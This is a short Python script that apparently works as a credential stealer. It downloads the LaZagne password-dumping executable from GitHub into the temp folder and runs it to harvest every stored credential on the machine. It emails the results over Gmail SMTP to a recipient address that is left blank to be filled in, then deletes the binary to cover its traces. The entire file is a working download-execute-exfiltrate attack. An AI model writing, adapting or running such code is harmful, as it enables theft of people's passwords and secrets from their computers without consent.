#!/usr/bin/env python
import requests
import subprocess
import smtplib
from email.mime.text import MIMEText
import os
import tempfile

# Email Configuration
sender_mail = '#' #please enter the sender mail id
receiver_mail = '#' #please enter the recieving mail id
passkey = "#" #generate a sender mail app password and paste it
subject = "System Information"

# Download Function
def download(url):
    temp_dir = tempfile.gettempdir()  # Get the system's temp directory
    os.chdir(temp_dir)  # Change the working directory to temp
    filename = url.split("/")[-1]  # Extract the filename from the URL
    response = requests.get(url)  # Download the file
    response.raise_for_status()  # Raise exception if download fails
    with open(filename, "wb") as file:
        file.write(response.content)  # Save the file
    return temp_dir, filename

# Command Execution Function
def exec_cmd(file_path):
    try:
        output = subprocess.check_output([file_path, "all"], stderr=subprocess.STDOUT)
        return output.decode("utf-8", errors="ignore")
    except subprocess.CalledProcessError as e:
        return str(e)

# Email Sending Function
def send_mail(sender_mail, receiver_mail, passkey, subject, body):
    message = MIMEText(body, "plain")
    message["Subject"] = subject
    message["From"] = sender_mail
    message["To"] = receiver_mail

    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(sender_mail, passkey)
        server.sendmail(sender_mail, receiver_mail, message.as_string())
    except smtplib.SMTPException as e:
        pass
    finally:
        server.quit()

# Main Execution
try:
    url = "https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.6/LaZagne.exe"
    temp_dir, filename = download(url)  # Download the file
    file_path = os.path.join(temp_dir, filename)  # Create full file path

    if os.path.exists(file_path):
        result = exec_cmd(file_path)  # Execute the downloaded file
        send_mail(sender_mail, receiver_mail, passkey, subject, result)  # Send the result via email
    else:
        pass
finally:
    # Cleanup: Remove the temporary file
    if os.path.exists(file_path):
        os.remove(file_path)

